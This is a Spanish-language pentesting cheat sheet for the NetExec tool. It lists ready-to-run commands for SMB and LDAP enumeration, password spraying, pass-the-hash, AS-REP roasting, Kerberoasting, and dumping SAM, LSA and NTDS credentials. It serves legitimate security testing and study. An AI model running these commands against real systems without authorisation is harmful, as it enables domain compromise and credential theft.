---
title: NetExec (nxc)
resumen: Sustituto de CrackMapExec. Enumeración y ataques contra SMB, LDAP, WinRM y RDP en un solo binario.
tags: swiss-army-knife
---

Sustitución del antiguo **CrackMapExec**. Se usa para enumerar usuarios, dominio, nombre local, shares y grupos, y para lanzar ataques directamente, sobre RDP, WinRM, LDAP y sobre todo SMB.

> `(pwned!)` en la salida indica un usuario con privilegios administrativos sobre ese equipo — probar `psexec`. En RDP o WinRM esa marca no aplica igual.

### Enumeración (SMB — puerto 445)

```bash
nxc smb 10.10.10.10 -u "" -p ""                 # Versión, dominio y nombre local. signing:False = vulnerable a Relay
nxc smb ips_available.txt -u "" -p ''           # Enumera los equipos de un archivo
nxc smb 10.10.10.0/24                           # Enumerar equipos de un rango

nxc smb 10.10.10.10 -u "" -p '' --users         # Usuarios con sesión nula
nxc smb 10.10.10.10 -u "" -p '' --rid-brute     # Usuarios/grupos con sesión nula (fuerza bruta de RID)
nxc smb 10.10.10.10 -u "USER" -p 'PASS' --shares
```

```bash
# Construir una wordlist de usuarios a partir de --rid-brute
nxc smb 10.10.10.10 -u "" -p "" --rid-brute > wordlist_users.txt
cat wordlist_users.txt | awk '{split($6, a, "\\\\"); print a[2]}' > dic_users.txt
```

### Validar credenciales / fuerza bruta

```bash
# --continue-on-success: sigue probando aunque ya haya encontrado válido
# --no-bruteforce: empareja línea a línea (user=pass, o listas coordinadas)
# -t X: hilos concurrentes

nxc smb 10.10.10.10 -u "USER" -p "dic_passwds.txt" --continue-on-success

# Password spraying (una contraseña contra muchos usuarios)
nxc smb 10.10.10.10 -u "dic_users.txt" -p "PASS" --continue-on-success

# Pass the Hash a varios usuarios
nxc smb 10.10.10.10 -u "dic_users.txt" -H "dic_hashesNTLM.txt" --continue-on-success --no-bruteforce -t 30
```

### LDAP (389/636)

```bash
nxc ldap 10.10.10.10 -u 'USER' -p 'PASSWORD' --query "(objectClass=user)" "userPrincipalName"
```

### WinRM / RDP

```bash
netexec winrm 10.10.10.10 -u "usuario" -p "password"
netexec rdp 10.10.10.10 -u "usuario" -p 'contraseña'
```

### Ataques

```bash
# AS-REP Roast
nxc ldap DC_IP -u domain_users.txt -p '' --asreproast asrep_hashes.txt

# Kerberoasting
nxc ldap DC_IP -u "USER" -p 'PASS' --kerberoasting kerberoast_hashes.txt

# Dumps (requieren privilegios)
nxc smb 10.10.10.10 -u USER -p 'PASSWORD' -d dominio.local --sam
nxc smb 10.10.10.10 -d DOMINIO -u USER -p 'PASSWORD' --lsa
nxc smb IP_DC -u USER -p 'PASSWORD' --ntds

# BadSuccessor: comprobación
nxc ldap dc01 -u "usuario" -p 'contraseña' -M badsuccessor
```

### Técnicas donde aparece

[[enumeracion-smb-rpc]] · [[enumeracion-ldap]] · [[kerberoasting]] · [[asreproasting]] · [[password-spraying]] · [[smb-relay]] · [[pass-the-hash]] · [[dcsync]] · [[badsuccessor]]
